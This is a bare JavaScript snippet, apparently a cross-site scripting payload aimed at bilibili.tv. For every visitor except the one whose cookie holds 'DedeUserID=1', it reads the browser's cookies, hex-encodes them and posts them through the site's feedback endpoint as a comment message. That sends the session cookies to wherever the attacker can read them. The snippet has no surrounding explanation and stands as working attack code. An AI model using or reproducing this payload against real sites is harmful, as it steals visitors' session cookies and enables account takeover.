if(document.cookie.indexOf("DedeUserID=1")<0){
for(var d=document.cookie,e="",f=0;f<d.length;f++)var g=d.charCodeAt(f).toString(16),e=e+(2>g.length?"0"+g:g);$.post("http://www.bilibili.tv/feedback/post",{aid:"271",action:"send",msg:e});
}
